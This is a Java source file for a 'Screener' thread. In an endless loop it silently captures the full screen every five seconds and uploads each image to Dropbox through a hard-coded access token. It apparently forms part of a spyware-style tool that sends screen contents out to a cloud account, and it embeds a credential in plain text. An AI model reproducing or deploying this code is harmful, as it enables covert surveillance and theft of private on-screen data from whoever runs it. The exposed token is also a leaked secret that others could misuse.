import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

public class Screener extends Thread {

  private static final String ACCESS_TOKEN = "4vQ9AsvNvpAAAAAAAAAAAX0hnyqFEzWqrOYgYqCpbLkopcpHrYtjgWNOOtYbdWGD";
  private DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
  private DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

  @Override
  public void run() {
    try {
      Robot robot = new Robot();
      Rectangle area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

      while (true) {
        Uploader uploader = new Uploader();
        BufferedImage image = robot.createScreenCapture(area);
        uploader.setImage(image);
        uploader.setClient(client);
        uploader.start();
        sleep(5000);
      }

    } catch (AWTException | InterruptedException e) {
      e.printStackTrace();
    }
  }
}
